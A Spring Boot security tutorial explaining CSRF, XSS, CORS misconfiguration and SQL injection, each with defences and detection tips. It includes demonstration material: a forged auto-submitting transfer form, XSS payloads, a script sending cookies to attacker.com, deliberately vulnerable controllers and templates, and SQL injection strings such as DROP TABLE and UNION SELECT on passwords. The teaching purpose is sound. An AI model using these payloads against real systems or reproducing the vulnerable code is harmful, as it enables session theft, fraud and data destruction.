# Common Web Attacks (and How a Spring Boot Developer Stops Them)

Before we start Spring Security, let's understand the common attacks it (and we) must defend against. For each one: **how it happens → how to stop it in Spring Boot → how to see that it happened.**

## Table of Contents

1. [Overview](#1-overview)
2. [CSRF (Cross-Site Request Forgery)](#2-csrf-cross-site-request-forgery)
3. [XSS (Cross-Site Scripting)](#3-xss-cross-site-scripting)
4. [CORS (Cross-Origin Resource Sharing)](#4-cors-cross-origin-resource-sharing)
5. [SQL Injection](#5-sql-injection)
6. [Other attacks Spring Security handles for you](#6-other-attacks-spring-security-handles-for-you)
7. [How Spring Security fits in](#7-how-spring-security-fits-in)
8. [How to see that an attack happened (summary)](#8-how-to-see-that-an-attack-happened-summary)
9. [Summary & best practices](#9-summary--best-practices)
10. [Interview Questions](#10-interview-questions)

---

## 1. Overview

![svg](<svgs/01-attacks-overview.svg>)

| Attack | What is it? | Impact | Works in | Prevented by |
|---|---|---|---|---|
| **CSRF** | Tricks a logged-in browser into sending an unwanted request | State change: money transfer, data modification | Stateful apps (cookies / session) | CSRF token, SameSite cookies, no state changes via GET |
| **XSS** | Injects malicious JavaScript into web pages | Steal cookies/tokens, hijack the session, deface the site, redirect users | All web apps that render user input | Output encoding, input validation, HttpOnly cookies, CSP |
| **CORS** | Not an attack: a browser rule that controls requests from a different origin | Data theft by evil websites (if misconfigured) | Web apps with browser ↔ server calls across origins | Correct CORS config: specific allowed origins, careful with credentials |
| **SQL Injection** | Injects malicious SQL through user input | Read, modify, delete data; drop tables; leak the DB | Apps that build raw SQL / native queries from strings | Parameterized queries / `PreparedStatement`, ORM (JPA), input validation |

**Memory trick:** CSRF = **C**ookies + SameSite · XSS = e**X**ecute **S**cript · CORS = **C**ross **O**rigin · SQLi = **Q**uery **I**njection.

---

## 2. CSRF (Cross-Site Request Forgery)

### 2.1 What is it?

- The user is **already authenticated** to a site (e.g. logged in to `bank.com`).
- A CSRF attack **tricks the browser into making an unwanted request** to that site.
- It works because the **browser automatically sends cookies** (like `JSESSIONID`) with every request to that site, **no matter which page started the request**.
- So it only applies where **state and session are managed with cookies** (stateful apps).

### 2.2 How the attack happens

![svg](<svgs/02-csrf-attack-flow.svg>)

1. Victim logs in to `bank.com`. The server creates a session and sends `Set-Cookie: JSESSIONID=abc123`.
2. The browser stores the cookie for the `bank.com` domain.
3. The victim opens `evil.com` (phishing email, ad, link in a chat). No bank cookie is sent to `evil.com`.
4. The evil page triggers a request to `bank.com/transfer`, using a link or an auto-submitted hidden form.
5. Because the request goes **to `bank.com`**, the browser automatically attaches the `bank.com` cookie.
6. `bank.com` sees a valid session, thinks the user made the request, and transfers the money.

**GET version.** The attacker only needs the victim to open a URL:

```text
http://bank.com/transfer?amount=1000&to=attacker
                         ↑ money to steal ↑ attacker account
```

**POST version.** State changes should be done with POST, where the parameters go in the request body, not the URL. That makes tricking the user a bit harder, but not impossible. The attacker builds a website with a hidden form and sends its link in a phishing email. As soon as the page loads, the form is submitted:

```html
<!-- evil.com/claim.html -->
<body onload="document.csrf.submit()">
  <form action="http://bank.com/transfer" method="POST" name="csrf">
      <input type="hidden" name="amount" value="1000">
      <input type="hidden" name="to" value="attacker">
      <!-- no _csrf token here: the attacker doesn't know it -->
  </form>
</body>
```

If the server has no CSRF token validation, the money is transferred.

### 2.3 Demo: seeing the attack work

In this demo authentication is mandatory for all endpoints, using session (stateful) based authentication.

**SecurityConfig.java**

```java
@Configuration
@EnableWebSecurity
public class SecurityConfig {

    @Bean
    public SecurityFilterChain securityFilterChain(HttpSecurity http) throws Exception {

        http.sessionManagement(session ->
                session.sessionCreationPolicy(SessionCreationPolicy.IF_REQUIRED))
            .authorizeHttpRequests(auth -> auth.anyRequest().authenticated())
            .formLogin(Customizer.withDefaults());

        return http.build();
    }
}
```

**UserController.java (CSRF demo)**

```java
@RestController
public class UserController {

    @GetMapping("/transfer")              // ⚠️ state change on a GET endpoint
    public String transferMoney(@RequestParam String amount, @RequestParam String to) {
        return "Transferred $" + amount + " to " + to;
    }

    @GetMapping("/")
    public String hello() {
        return "hello";
    }
}
```

**Step 1: make the user authenticated on the server.**
The user logs in through the default Spring Security login page. In DevTools → Network, the `POST /login` response is `302 Found` with:

```text
Set-Cookie: SESSION=ZmMxYmQxZTUtYTEzYS00NzIzLWE1YmItMDk3ZDI0N2MwMGIx; Path=/; HttpOnly; SameSite=Lax
```

**Step 2: send a malicious link to this authenticated user.**
The attacker's page (`attack.html`) shows **"Click Below to Claim Your Reward!"** with a **"Claim My Money"** button. The button points to `http://localhost:8080/transfer?amount=1000&to=attacker`.

**Step 3: the user clicks.** The browser shows `Transferred $1000 to attacker`. In DevTools → Network → the `transfer` request → **Request Headers**, the session cookie was attached automatically:

```text
Cookie: JSESSIONID=...; SESSION=ZmMxYmQxZTUtYTEzYS00NzIzLWE1YmItMDk3ZDI0N2MwMGIx
```

**Why did it work even though Spring Security has CSRF protection ON by default?**
1. Spring's `CsrfFilter` checks **only state-changing methods** (POST, PUT, PATCH, DELETE). It never checks **GET**, HEAD, OPTIONS or TRACE. A money transfer behind `@GetMapping` is unprotected.
2. The cookie is `SameSite=Lax`. Lax still sends the cookie when the user **clicks a link** (top-level GET navigation) from another site.

Fix the endpoint first: `@PostMapping("/transfer")`. Now the forged form from 2.2 gets **`403 Forbidden`**, because it can't include a valid CSRF token.

### 2.4 How to stop CSRF in Spring Boot

#### A. Never change state with GET

Use `POST`/`PUT`/`PATCH`/`DELETE` for anything that changes data. GET must be safe (read-only).

#### B. CSRF token (synchronizer token pattern): on by default in Spring Security

![svg](<svgs/03-csrf-token-protection.svg>)

- The server generates a **random token** and stores it in the session.
- The token is sent to the client **inside the form** (hidden field) or in a header.
- The client must send the same token with **every state-changing request**.
- The server compares it with the stored token. If it's missing or invalid → **`403 Forbidden`**.
- `evil.com` can't read the token, because the Same-Origin Policy stops it from reading `bank.com` pages. That's why the forged request has no token.

Stateful web app (CSRF enabled by default; nothing to add):

```java
@Bean
public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
    http
        .authorizeHttpRequests(auth -> auth.anyRequest().authenticated())
        .formLogin(Customizer.withDefaults());     // CSRF enabled by default
    return http.build();
}
```

The token is sent in a hidden input field named `_csrf`, or in the header `X-CSRF-TOKEN`. With Thymeleaf, `th:action` adds the hidden field automatically:

```html
<form th:action="@{/transfer}" method="post">
    <!-- Thymeleaf inserts: <input type="hidden" name="_csrf" value="7f3a..."> -->
    <input type="text" name="amount"/>
    <button type="submit">Transfer</button>
</form>

<!-- plain HTML / other template engines: add it yourself -->
<input type="hidden" name="_csrf" th:value="${_csrf.token}"/>
```

Single-page app (React/Angular) talking to a session-based backend: store the token in a cookie that JavaScript can read. The frontend sends it back in the `X-XSRF-TOKEN` header (Angular and axios do this automatically):

```java
http.csrf(csrf -> csrf
        .csrfTokenRepository(CookieCsrfTokenRepository.withHttpOnlyFalse())   // XSRF-TOKEN cookie
        .csrfTokenRequestHandler(new CsrfTokenRequestAttributeHandler()));
```

(See the "Single-Page Applications" section of the Spring Security CSRF docs for the full SPA setup.)

#### C. SameSite cookies

![svg](<svgs/04-samesite-cookie-matrix.svg>)

```properties
server.servlet.session.cookie.same-site=strict   # or lax
server.servlet.session.cookie.http-only=true
server.servlet.session.cookie.secure=true        # only over HTTPS
```

- `Strict`: the cookie is never sent on requests started by another site.
- `Lax` (browser default): not sent on cross-site POST/iframe/fetch, but **sent on top-level GET navigation** (clicking a link).
- SameSite is **defense in depth**. Keep CSRF tokens too (older browsers, subdomain attacks, Lax + GET).

#### D. Stateless REST APIs with JWT: CSRF can be disabled

CSRF needs the browser to attach credentials **automatically**. If the client sends a JWT in the `Authorization: Bearer ...` header (added by your JavaScript, never automatically by the browser) and you use **no session cookies**, there is nothing for the attacker to abuse:

```java
@Bean
public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
    http
        .csrf(csrf -> csrf.disable())     // OK only because we don't use cookies for auth
        .sessionManagement(sm -> sm.sessionCreationPolicy(SessionCreationPolicy.STATELESS))
        .authorizeHttpRequests(auth -> auth.anyRequest().authenticated())
        .httpBasic(Customizer.withDefaults());
    return http.build();
}
```

> ⚠️ If you store the JWT **in a cookie**, the browser sends it automatically again, so you need CSRF protection back.

#### E. Other good practices

- Use POST for state-changing operations.
- Optionally validate the `Origin` / `Referer` header for sensitive endpoints.
- Re-authenticate (or use OTP) for critical actions like transfers or changing an email or password.

### 2.5 How to see that a CSRF attack happened

- **Browser DevTools → Network:** the state-changing request to `bank.com` has `Origin` / `Referer` pointing to **another site**, and the `Cookie` header is present.
- **Server logs:** with `logging.level.org.springframework.security=DEBUG` (development only), blocked attempts log `Invalid CSRF token found for http://...` and return 403.
- **Log every CSRF rejection** in production with an `AccessDeniedHandler`:

```java
http.exceptionHandling(ex -> ex.accessDeniedHandler((request, response, e) -> {
    if (e instanceof CsrfException) {          // MissingCsrfTokenException / InvalidCsrfTokenException
        log.warn("CSRF blocked: {} {} origin={} referer={} ip={}",
                request.getMethod(), request.getRequestURI(),
                request.getHeader("Origin"), request.getHeader("Referer"),
                request.getRemoteAddr());
    }
    response.sendError(HttpServletResponse.SC_FORBIDDEN);
}));
```

- **Monitoring:** alert on a spike of `403` responses on POST endpoints (`http.server.requests{status="403"}` in Actuator/Micrometer).
- **Audit trail:** record who changed what, plus `Origin`/`Referer`/IP for sensitive actions. A transfer right after the user visited another site, which the user says they didn't make, is the classic sign.

---

## 3. XSS (Cross-Site Scripting)

### 3.1 What is it?

- XSS lets an attacker **put malicious JavaScript into a web page viewed by other users** (e.g. a comments section).
- The script runs in the **victim's browser** with the **same origin** as your site, so it has full access to the page.
- Commonly used to steal session data, perform actions as the user, redirect users, or deface the website.

### 3.2 Why the browser executes the script

The browser parses the HTML → builds the DOM tree → fetches resources (CSS, JS) → executes JS. When it finds a `<script>` tag or an event handler (`onerror`, `onclick`, `onload`…), it treats it as JavaScript code and runs it with your site's origin.

**Example payloads (any of these will execute):**

```html
<script>alert("XSS")</script>
<img src="x" onerror="alert('XSS')">
<svg onload="alert('XSS')">
<a href="javascript:alert('XSS')">Click</a>
```

### 3.3 Types of XSS

![svg](<svgs/06-xss-types.svg>)

1. **Stored XSS (persistent):** the script is stored in the DB (comments, profile, etc.) and runs whenever the page loads, for every visitor.
2. **Reflected XSS (non-persistent):** the script comes in the URL/request and is immediately reflected in the response (e.g. `/search?q=<script>...</script>` → "No results for <script>...").
3. **DOM-based XSS:** happens in client-side JS that writes untrusted data into the DOM (`innerHTML`, `document.write`) without involving the server.

### 3.4 How the attack happens: stored XSS demo (Spring Boot + Thymeleaf)

![svg](<svgs/05-stored-xss-flow.svg>)

For the demo:
- `GET /xss` loads all comments. It returns `"xss"`; since it's a `@Controller` (not a `@RestController`), Spring looks for `xss.html` and renders it.
- `POST /comment` doesn't sanitize the user input. It simply stores the comment (say in the DB) and displays it on the next GET.

So if an attacker puts a malicious script in a comment, that script runs for **every user who opens the page**.

**TestXSS.java**

```java
@Controller
public class TestXSS {

    private final List<String> comments = new ArrayList<>();

    @GetMapping("/xss")
    public String showComments(Model model) {
        model.addAttribute("comments", comments);
        return "xss"; // Loads xss.html
    }

    @PostMapping("/comment")
    public String addComment(@RequestParam String comment) {
        comments.add(comment);          // No validation / sanitization !!
        return "redirect:/xss";
    }
}
```

**src/main/resources/templates/xss.html (vulnerable)**

```html
<!DOCTYPE html>
<html xmlns:th="http://www.thymeleaf.org">
<head>
<title>XSS Demo</title>
</head>
<body>

<h2>Leave a Comment</h2>

<form th:action="@{/comment}" method="post">
<input type="text" name="comment" required>
<button type="submit">Submit</button>
</form>

<h3>Comments:</h3>
<ul>
<!-- Vulnerable: th:utext renders HTML as it is (not escaped) -->
<li th:utext="${comment}" th:each="comment : ${comments}"></li>
</ul>

</body>
</html>
```

**Attack steps**
1. The attacker submits the comment `<script>alert('XSS Attack')</script>`.
2. It gets stored (in the DB).
3. Whenever any user opens `/xss`, the script is rendered and executed in their browser: a popup **"localhost:8080 says XSS Attack"** appears.
4. A real attacker won't show an alert. They'll steal data or act as the user instead.

**Stealing data:**

```html
<script>
fetch('http://attacker.com/steal?c=' + document.cookie);
</script>
```

Any user who loads this comments page sends their **readable** cookies to the attacker's URL. Cookies usually contain things like `JSESSIONID`, auth tokens, remember-me values.

> **Important nuance:** Tomcat marks `JSESSIONID` as **HttpOnly** by default, so `document.cookie` can't read it. But XSS is still game over: the script runs *inside your origin*, so it can call your APIs **as the user** (`fetch('/transfer', {method:'POST', ...})`), read the CSRF token from the page, and show a fake login form. **HttpOnly reduces the damage. It doesn't prevent XSS.**

### 3.5 How to stop XSS in Spring Boot

![svg](<svgs/07-xss-defense-layers.svg>)

#### A. Output encoding (escape HTML): the most important fix

Always escape user input before displaying it, by converting special characters to HTML entities:

| Character | Encoded |
|---|---|
| `<` | `&lt;` |
| `>` | `&gt;` |
| `"` | `&quot;` |
| `'` | `&#39;` |
| `&` | `&amp;` |

In Thymeleaf, use **`th:text`** (escapes automatically) instead of **`th:utext`** (renders raw HTML):

```html
<!-- Safe (escaped): the payload is shown as text -->
<li th:text="${comment}" th:each="comment : ${comments}"></li>

<!-- Unsafe (not escaped): the script executes. Avoid! -->
<li th:utext="${comment}" th:each="comment : ${comments}"></li>
```

With `th:text`, the same comment renders as `&lt;script&gt;alert('XSS Attack')&lt;/script&gt;` and the user just sees the text.

For **REST APIs** returning JSON, the danger moves to the frontend. React's `{value}` escapes by default, but `dangerouslySetInnerHTML`, `element.innerHTML = value`, and Angular's `bypassSecurityTrust...` don't.

#### B. Input validation (server side)

Validate data type, length and pattern. Use an **allow-list** (what's allowed) instead of a block-list:

```java
public record CommentRequest(
        @NotBlank
        @Size(max = 500)
        @Pattern(regexp = "^[\\p{L}\\p{N}\\s.,!?'-]*$", message = "Only plain text is allowed")
        String text) {}
```

Validation is a second layer. Still encode on output, because data can also come from other systems.

#### C. Sanitize when you really must accept HTML

For rich-text fields (blog editor), keep only safe tags with an HTML sanitizer:

```xml
<dependency>
    <groupId>com.googlecode.owasp-java-html-sanitizer</groupId>
    <artifactId>owasp-java-html-sanitizer</artifactId>
    <version>20240325.1</version>
</dependency>
```

```java
private static final PolicyFactory POLICY = Sanitizers.FORMATTING.and(Sanitizers.LINKS);

String safeHtml = POLICY.sanitize(userHtml);
// "<b>hi</b><script>steal()</script>"  →  "<b>hi</b>"
```

#### D. Content Security Policy (CSP)

CSP works at the browser level. It tells the browser which sources of content are allowed, so injected inline scripts and scripts from foreign domains are blocked:

```java
http.headers(headers -> headers
        .contentSecurityPolicy(csp -> csp.policyDirectives(
                "default-src 'self'; script-src 'self'; img-src 'self' data:; " +
                "object-src 'none'; frame-ancestors 'none'")));
```

Resulting header:

```text
Content-Security-Policy: default-src 'self'; script-src 'self'; img-src 'self' data:; object-src 'none'; frame-ancestors 'none'
```

#### E. HttpOnly (and Secure, SameSite) cookies

`HttpOnly` stops JavaScript from reading the cookie:

```text
Set-Cookie: JSESSIONID=abc123; HttpOnly; Secure; SameSite=Strict
```

```properties
server.servlet.session.cookie.http-only=true
server.servlet.session.cookie.secure=true
server.servlet.session.cookie.same-site=strict
```

> `X-XSS-Protection` is an old browser feature that is now deprecated. Spring Security sends `X-XSS-Protection: 0` on purpose. Rely on encoding + CSP instead.

### 3.6 How to see that an XSS attack happened

- **Search stored data and logs** for typical payload fragments: `<script`, `onerror=`, `onload=`, `javascript:`, `<svg`, `<iframe`.
- **CSP violation reports.** Roll CSP out in report-only mode first: the browser **reports** every blocked script without breaking the page:

```java
http.headers(h -> h.contentSecurityPolicy(csp -> csp
        .policyDirectives("script-src 'self'; report-uri /csp-report")
        .reportOnly()));
```

```java
@RestController
@Slf4j
public class CspReportController {

    @PostMapping(value = "/csp-report", consumes = {"application/csp-report", "application/json"})
    public ResponseEntity<Void> report(@RequestBody String body) {
        log.warn("CSP violation: {}", body);   // blocked-uri, violated-directive, document-uri ...
        return ResponseEntity.noContent().build();
    }
}
```

(Permit `/csp-report` without authentication and exclude it from CSRF.)

- **Browser DevTools:** Console errors like `Refused to execute inline script because it violates the following Content Security Policy directive...`, or Network requests to unknown domains carrying cookies/tokens.
- **WAF / reverse proxy logs** (Cloudflare, AWS WAF) flag XSS signatures in request parameters.

---

## 4. CORS (Cross-Origin Resource Sharing)

CORS is **not an attack**. It's a browser security feature that stops web pages from reading responses from a different origin, unless the server allows it. A **misconfigured** CORS policy, though, can let an evil site read your users' data.

### 4.1 What is an origin?

**Origin = protocol + domain (host) + port.** If any one of these differs, it's a different origin. Path, query parameters and fragments (`#abc`) do **not** affect the origin.

![svg](<svgs/08-what-is-an-origin.svg>)

| URL | Origin | Compared with `http://localhost:8080` |
|---|---|---|
| `http://localhost:8080/app` | http + localhost + 8080 | Same |
| `http://localhost:9090` | http + localhost + 9090 | Different port |
| `https://localhost:8080` | https + localhost + 8080 | Different protocol |
| `http://127.0.0.1:8080` | http + 127.0.0.1 + 8080 | Different domain (host) |
| `http://sub.localhost:8080` | http + sub.localhost + 8080 | Different domain |
| `http://example.com:8080` | http + example.com + 8080 | Different domain |

More examples from the original notes:

```text
Client: https://localhost:8080   Server: http://localhost:8080    → different protocol
Client: https://localhost:9090   Server: https://localhost:8080   → different port
Client: https://sub.localhost:9090  Server: https://localhost:9090 → different domain
```

### 4.2 Same-Origin Policy (SOP) and CORS

- **SOP** is the default browser policy: JavaScript from one origin can't **read** responses from another origin.
- **CORS** is how a server **relaxes** this policy: it sends headers like `Access-Control-Allow-Origin` to say which other origins may read its responses.
- So whenever there's a call between different origins, the **server** must allow it by setting `Access-Control-Allow-Origin` and the related headers.

### 4.3 How CORS works: simple vs preflight requests

![svg](<svgs/09-cors-simple-vs-preflight.svg>)

**A) Simple request.** Method is GET, HEAD or POST, with only simple headers (`Accept`, `Accept-Language`, `Content-Language`, `Content-Type` of `application/x-www-form-urlencoded`, `multipart/form-data` or `text/plain`):
1. The browser sends the actual request with `Origin: http://origin-a.com`.
2. The server responds with `Access-Control-Allow-Origin: http://origin-a.com`.
3. The browser lets JS read the response only if the header matches.

**B) Preflight request.** For anything else: PUT/DELETE/PATCH, `Content-Type: application/json`, custom headers like `Authorization`:
1. The browser first sends `OPTIONS /api/data` with `Origin`, `Access-Control-Request-Method: POST`, `Access-Control-Request-Headers: Authorization`.
2. The server answers with `Access-Control-Allow-Origin`, `-Allow-Methods`, `-Allow-Headers`, `-Allow-Credentials` (if needed).
3. Only if that's OK does the browser send the actual request.
4. The actual response.

**Important CORS response headers**

| Header | Meaning |
|---|---|
| `Access-Control-Allow-Origin` | Which origin is allowed (`*` or an exact origin) |
| `Access-Control-Allow-Methods` | Allowed HTTP methods (GET, POST, PUT, DELETE, OPTIONS) |
| `Access-Control-Allow-Headers` | Allowed request headers (Content-Type, Authorization, …) |
| `Access-Control-Allow-Credentials` | Whether cookies / auth info may be sent (`true`/`false`) |
| `Access-Control-Max-Age` | How long (seconds) the browser can cache the preflight response |
| `Vary: Origin` | Tells caches that the response differs per Origin |

### 4.4 How to configure CORS correctly in Spring Boot

**With Spring Security** (needed so preflight `OPTIONS` requests aren't rejected with 401 before CORS headers are added):

```java
@Configuration
@EnableWebSecurity
public class SecurityConfig {

    @Bean
    public SecurityFilterChain securityFilterChain(HttpSecurity http) throws Exception {

        http.sessionManagement(session ->
                session.sessionCreationPolicy(SessionCreationPolicy.IF_REQUIRED))
            .authorizeHttpRequests(auth -> auth.anyRequest().authenticated())
            .cors(cors -> cors.configurationSource(request -> {
                CorsConfiguration config = new CorsConfiguration();
                config.setAllowedOrigins(List.of("https://sub.localhost:9090")); // Allow frontend
                config.setAllowedMethods(List.of("GET", "POST", "PUT", "DELETE"));
                config.setAllowedHeaders(List.of("Authorization", "Content-Type"));
                config.setAllowCredentials(true);
                return config;
            }))
            .formLogin(Customizer.withDefaults());

        return http.build();
    }
}
```

**Global configuration as a bean** (picked up by `.cors(Customizer.withDefaults())`):

```java
@Configuration
public class CorsConfig {

    @Bean
    public CorsConfigurationSource corsConfigurationSource() {
        CorsConfiguration config = new CorsConfiguration();
        config.setAllowedOrigins(List.of("http://localhost:3000"));
        config.setAllowedMethods(List.of("GET", "POST", "PUT", "DELETE", "OPTIONS"));
        config.setAllowedHeaders(List.of("Authorization", "Content-Type"));
        config.setAllowCredentials(true);   // allow cookies / auth header
        config.setMaxAge(3600L);            // cache preflight for 1 hour

        UrlBasedCorsConfigurationSource source = new UrlBasedCorsConfigurationSource();
        source.registerCorsConfiguration("/**", config);
        return source;
    }
}
```

**Per controller with `@CrossOrigin`:**

```java
@RestController
@RequestMapping("/api")
@CrossOrigin(origins = "http://localhost:3000", allowCredentials = "true")
public class UserController {

    @GetMapping("/users")
    public List<User> getUsers() {
        return userService.getAll();
    }
}
```

### 4.5 How a CORS misconfiguration becomes an attack

| Misconfiguration | Why it's dangerous |
|---|---|
| `allowedOriginPatterns("*")` + `allowCredentials(true)` | Echoes back **any** origin together with cookies, so `evil.com` JS can read the logged-in user's data. |
| Reflecting the `Origin` header in a custom filter without checking it | Same effect: every site is trusted. |
| Trusting `null` origin, or loose patterns like `*.example.com` that include user-controlled subdomains | Sandboxed iframes / taken-over subdomains get access. |
| `allowedOrigins("*")` + `allowCredentials(true)` | Spring refuses this combination (`IllegalArgumentException`), and browsers refuse it too. Don't try to work around it. |

> **CORS is not CSRF protection.** For *simple* requests (like a form POST) the browser still **sends** the request. CORS only stops JS from **reading** the response. The money is already gone. Use CSRF tokens for that.

### 4.6 ⚠️ Critical question: does CORS protect against non-browser clients (Postman, cURL, Python scripts, mobile apps)?

**Answer: NO, absolutely NOT!** CORS provides **zero protection** against non-browser clients.

![svg](<svgs/10-cors-does-not-protect-api.svg>)

#### 1. Why CORS does NOT protect against non-browser clients

1. **CORS is a browser-enforced mechanism (not a server firewall):**
   - CORS is implemented and enforced only by the **web browser**, as part of the **Same-Origin Policy (SOP)**.
   - When JavaScript in a browser makes a cross-origin request, the browser checks the server's response headers (`Access-Control-Allow-Origin`). If the origin isn't permitted, the **browser blocks the JavaScript application from reading the response**.
   - The backend server may still receive and execute the request. It's the **browser** that enforces the restriction!

2. **Non-browser clients ignore the Same-Origin Policy completely:**
   - Tools like **Postman**, **cURL**, **Python (`requests`)**, **Java (`HttpClient`)**, **Node.js**, and **native mobile apps (Android / iOS)** are **not web browsers**.
   - They have no Same-Origin Policy engine.
   - They read the raw response directly. Whether the server sends `Access-Control-Allow-Origin` or not makes no difference; they show the response regardless.

3. **The `Origin` header can be trivially spoofed:**
   - In a web browser, JavaScript can't change the `Origin` header (the browser controls it for security).
   - In `curl` or Postman, an attacker can set any `Origin` header with a single flag:
     ```bash
     curl -H "Origin: https://sub.localhost:9090" http://localhost:8080/api/users
     ```
   - So checking the `Origin` header on the server is not an authentication mechanism.

#### 2. Browser vs non-browser comparison

| Client Type | Does CORS Protect Your API? | Why? |
| :--- | :--- | :--- |
| **Web Browser (Chrome, Firefox, Safari)** | **YES** | The browser enforces the Same-Origin Policy and blocks unauthorized cross-origin JavaScript from reading responses. |
| **Postman / cURL** | **NO** | They don't enforce browser policies and read raw HTTP responses directly. |
| **Mobile Apps (iOS / Android)** | **NO** | Native mobile networking stacks don't enforce the browser Same-Origin Policy. |
| **Automated Bots & Scrapers (Python, Go)** | **NO** | Direct HTTP requests bypass any browser engine. |

> 💡 **Core takeaway:**
> - **CORS protects the USER'S BROWSER SESSION** from malicious third-party websites (`evil.com` trying to steal data through the user's browser credentials).
> - **CORS DOES NOT protect the BACKEND API** from attackers, scrapers, or direct API abuse.

#### 3. How to actually protect APIs from non-browser clients

Since CORS can't secure your API against non-browser clients, use these production security layers instead:
1. **Authentication & authorization:** require JWT Bearer tokens, OAuth2, or API keys on every protected endpoint. Unauthorized requests are rejected with `401 Unauthorized` or `403 Forbidden`.
2. **Rate limiting & throttling:** use Spring Cloud Gateway, a Redis token bucket, or Bucket4j to block abusive high-frequency requests (`429 Too Many Requests`).
3. **Web Application Firewall (WAF) & bot detection:** services like Cloudflare or AWS WAF detect and block automated bot traffic, scrapers, and headless browsers.
4. **Mutual TLS (mTLS):** for server-to-server microservice communication, require client TLS certificates so only verified clients can connect.
   - **How it works:** in standard HTTPS (one-way TLS), only the server presents a certificate to prove who it is. In **mTLS (two-way TLS)**, the server also requests and cryptographically verifies an X.509 certificate from the client during the TLS handshake.
   - **Why it stops non-browser attackers:** if an attacker sends requests via `curl`, Postman, or a Python script without a valid client certificate and matching private key signed by a trusted CA, the **TLS connection is cut at the network layer**. No HTTP request ever reaches your Spring Boot controllers or filters!
   - **Spring Boot configuration:**
     ```properties
     server.port=8443
     server.ssl.enabled=true
     # Server's own identity (Keystore)
     server.ssl.key-store=classpath:server-keystore.p12
     server.ssl.key-store-password=password
     # Mandate client certificate verification (Truststore)
     server.ssl.client-auth=need
     server.ssl.trust-store=classpath:server-truststore.p12
     server.ssl.trust-store-password=password
     ```
5. **Mobile app attestation:** for mobile apps, use the Google Play Integrity API or Apple App Attest / DeviceCheck to verify that requests come from genuine, unmodified copies of your official app.

### 4.7 How to see CORS problems (and misconfigurations)

- **Browser console:** `Access to fetch at 'http://localhost:8080/api' from origin 'http://localhost:3000' has been blocked by CORS policy: No 'Access-Control-Allow-Origin' header is present on the requested resource.`
- **DevTools → Network:** look for the `OPTIONS` preflight request. Check its status (401/403 = Spring Security blocked it, so `.cors()` is missing) and its `Access-Control-*` response headers.
- **Server logs:** `logging.level.org.springframework.web.cors=DEBUG` shows why an origin was rejected.
- **Test for a dangerous misconfiguration** (on your own app):
  ```bash
  curl -i -H "Origin: https://evil.com" https://your-api.com/api/me
  # 🚩 BAD if the response contains:
  #   Access-Control-Allow-Origin: https://evil.com
  #   Access-Control-Allow-Credentials: true
  ```

---

## 5. SQL Injection

### 5.1 What is it?

The attacker manipulates a SQL query by inserting malicious input into a user-controlled field. They can **read, modify or delete data**, and sometimes **drop tables** or take over the whole database.

### 5.2 How the attack happens: demo

![svg](<svgs/11-sql-injection-concat-vs-parameter.svg>)

**UserController.java (find user)**

```java
@GetMapping("/find")
public List<UserDetails> findUser(@RequestParam String name) {
    return userDetailsService.findByName(name);
}
```

**UserDetailsService.java (unsafe query)**

```java
public List<UserDetails> findByName(String name) {

    String sql = "SELECT * FROM user_details WHERE user_name = '" + name + "'";
    return entityManager.createNativeQuery(sql, UserDetails.class)
            .getResultList();
}
```

The attacker calls `localhost:8080/find?name=' OR '1' = '1`:

```text
Request       : GET /find?name=' OR '1'='1
Generated SQL : SELECT * FROM user_details WHERE user_name = '' OR '1'='1'
Result        : returns ALL rows from user_details !!
```

The quote in the input **closes the string**, and the injected `OR '1'='1'` is always true. The query returns every row instead of one specific user. With two users in the table, the response is:

```json
[{"userId":1,"name":"AA","phone":111},{"userId":2,"name":"BB","phone":222}]
```

It can get much worse:

```text
?name='; DROP TABLE user_details; --                              → deletes the table (if multiple statements are allowed)
?name=' UNION SELECT username, password, null FROM app_users --   → reads another table
?name=' AND SUBSTRING(password,1,1)='a' --                        → guesses data one character at a time (blind)
```

### 5.3 Types of SQL injection

1. **In-band SQLi:** uses the same channel to get the data (union-based, error-based).
2. **Inferential (blind) SQLi:** no data is returned directly. The attacker infers it from true/false responses or response time (boolean-based, time-based).
3. **Out-of-band SQLi:** data is sent out through another channel (DNS, HTTP requests from the DB server, email).

### 5.4 How to stop SQL injection in Spring Boot

#### A. Parameterized query / PreparedStatement

User input is sent **as a parameter**, not as part of the SQL text. The DB treats it as a **value**, never as executable code.

**UserDetailsService.java (safe query)**

```java
public List<UserDetails> findByName(String name) {

    String sql = "SELECT * FROM user_details WHERE user_name = :name";
    return entityManager.createNativeQuery(sql, UserDetails.class)
            .setParameter("name", name)     // :name is treated as a String value, NOT SQL code
            .getResultList();
}
```

With a parameterized query, the same injection attempt is treated as a literal string. The DB looks for a user literally named `' OR '1' = '1`, so the response is safely empty:

```json
[]
```

The same rule applies everywhere:

```java
// JPQL
em.createQuery("SELECT u FROM UserDetails u WHERE u.name = :name", UserDetails.class)
  .setParameter("name", name);

// @Query
@Query("SELECT u FROM UserDetails u WHERE u.name = :name")
List<UserDetails> search(@Param("name") String name);

// JdbcTemplate
jdbcTemplate.query("SELECT * FROM user_details WHERE user_name = ?", rowMapper, name);
```

#### B. Use Spring Data JPA (safe by default)

```java
public interface UserRepository extends JpaRepository<User, Long> {
    List<User> findByName(String name);   // JPA handles parameter binding
}
```

#### C. Dynamic SQL: build the structure, bind the values

- If a dynamic query is needed, build it with the **Criteria API / Specifications**, or with a `StringBuilder` that adds only **fixed SQL pieces** and binds every value as a parameter.
- **Column names and `ORDER BY` can't be bound as parameters**, so use an allow-list for them:

```java
private static final Set<String> SORTABLE = Set.of("name", "createdAt");

public List<UserDetails> list(String sortBy) {
    if (!SORTABLE.contains(sortBy)) {
        throw new IllegalArgumentException("Invalid sort field");
    }
    return em.createQuery("SELECT u FROM UserDetails u ORDER BY u." + sortBy, UserDetails.class)
             .getResultList();
}
```

#### D. Other security best practices

- Validate & sanitize input (type, length, format) with Bean Validation.
- Use a **least-privilege DB user**: the app's user shouldn't be able to `DROP` tables or read other schemas.
- Hide DB errors from users. Spring Boot's defaults (`server.error.include-message=never`, `include-stacktrace=never`) already do this. Don't return `e.getMessage()` from SQL exceptions.
- Use an ORM (JPA / Hibernate) whenever possible.
- **Never concatenate user input into SQL.**

### 5.5 How to see that SQL injection happened (or is possible)

- **SQL logs:** `spring.jpa.show-sql=true`, p6spy, or the DB's own query log. Look for quotes in odd places, `OR '1'='1'`, `UNION SELECT`, `--`, `;`, `SLEEP(` or `pg_sleep(`.
- **Error spikes:** a sudden burst of SQL syntax errors (`SQLGrammarException`) in the logs usually means someone is probing with quotes.
